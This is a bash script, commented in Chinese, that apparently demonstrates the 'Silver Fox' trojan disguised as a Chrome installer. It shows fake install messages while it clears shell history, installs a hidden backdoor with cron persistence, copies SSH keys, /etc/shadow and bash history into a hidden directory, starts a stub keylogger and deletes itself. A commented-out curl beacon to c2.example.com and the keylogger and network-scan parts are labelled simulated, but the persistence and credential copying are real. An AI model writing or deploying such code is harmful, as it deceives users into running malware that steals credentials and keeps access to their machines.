#!/bin/bash

# 银狐木马 - 伪装Chrome安装程序
# Silver Fox Trojan - Fake Chrome Installer

# 隐藏脚本执行痕迹
unset HISTFILE

# 日志函数
log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" >> /tmp/chrome_install.log 2>/dev/null
}

log "Chrome安装程序启动"

# 模拟安装过程
echo "正在下载Chrome浏览器..."
sleep 2

echo "正在验证文件完整性..."
sleep 1

echo "正在安装Chrome浏览器..."
sleep 3

# 创建后门
create_backdoor() {
    log "创建后门"

    # 创建隐藏目录
    mkdir -p /tmp/.chrome_update 2>/dev/null

    # 下载实际的后门程序（这里是模拟）
    cat > /tmp/.chrome_update/backdoor.sh << 'EOF'
#!/bin/bash
# 后门程序 - 每5分钟连接C2服务器

while true; do
    # 连接C2服务器并发送系统信息
    hostname=$(hostname)
    ip=$(hostname -I | awk '{print $1}')
    data="hostname=$hostname&ip=$ip&status=active"

    # 使用curl发送数据（模拟）
    # curl -s "http://c2.example.com/checkin?$data" >/dev/null 2>&1

    sleep 300  # 5分钟
done
EOF

    chmod +x /tmp/.chrome_update/backdoor.sh 2>/dev/null

    # 添加到cron作业
    (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.chrome_update/backdoor.sh") | crontab - 2>/dev/null

    log "后门创建完成"
}

# 窃取凭据
steal_credentials() {
    log "开始窃取凭据"

    # 查找常见的凭据文件
    cred_files=(
        "$HOME/.ssh/id_rsa"
        "$HOME/.ssh/id_rsa.pub"
        "$HOME/.bash_history"
        "/etc/passwd"
        "/etc/shadow"
    )

    for file in "${cred_files[@]}"; do
        if [ -f "$file" ]; then
            # 复制文件到临时位置（模拟外泄）
            cp "$file" /tmp/.chrome_update/ 2>/dev/null
            log "窃取文件: $file"
        fi
    done

    # 查找浏览器凭据（模拟）
    browser_dirs=(
        "$HOME/.mozilla/firefox"
        "$HOME/.config/google-chrome"
        "$HOME/Library/Application Support/Google/Chrome"
    )

    for dir in "${browser_dirs[@]}"; do
        if [ -d "$dir" ]; then
            # 模拟窃取浏览器数据
            log "发现浏览器目录: $dir"
        fi
    done
}

# 安装键盘记录器（模拟）
install_keylogger() {
    log "安装键盘记录器"

    cat > /tmp/.chrome_update/keylogger.sh << 'EOF'
#!/bin/bash
# 简单的键盘记录器模拟

LOGFILE="/tmp/.chrome_update/keys.log"

# 监控键盘输入（这里是模拟，实际实现会更复杂）
while true; do
    # 模拟记录键盘输入
    echo "[$(date)] Key pressed: simulated_input" >> "$LOGFILE"
    sleep 10
done
EOF

    chmod +x /tmp/.chrome_update/keylogger.sh 2>/dev/null
    nohup /tmp/.chrome_update/keylogger.sh >/dev/null 2>&1 &

    log "键盘记录器安装完成"
}

# 横向移动准备
prepare_lateral_movement() {
    log "准备横向移动"

    # 扫描本地网络
    log "扫描本地网络主机"

    # 模拟网络扫描
    for i in {1..254}; do
        # 模拟ping扫描
        if [ $((RANDOM % 10)) -gt 7 ]; then
            log "发现主机: 192.168.1.$i"
        fi
    done

    # 准备SMB利用工具（模拟）
    log "准备SMB利用工具"
}

# 主执行流程
main() {
    log "开始恶意活动"

    # 延迟执行，避免被立即发现
    sleep $((RANDOM % 10 + 5))

    create_backdoor
    steal_credentials
    install_keylogger
    prepare_lateral_movement

    log "Chrome安装完成"

    # 显示成功消息
    echo "Chrome浏览器安装成功！"
    echo "请重启浏览器以应用更新。"

    # 清理安装痕迹（模拟）
    rm -f "$0" 2>/dev/null

    log "安装程序退出"
}

# 检查是否以root权限运行
if [ "$EUID" -eq 0 ]; then
    log "以root权限运行，增加成功率"
fi

# 执行主函数
main &

# 退出安装脚本
exit 0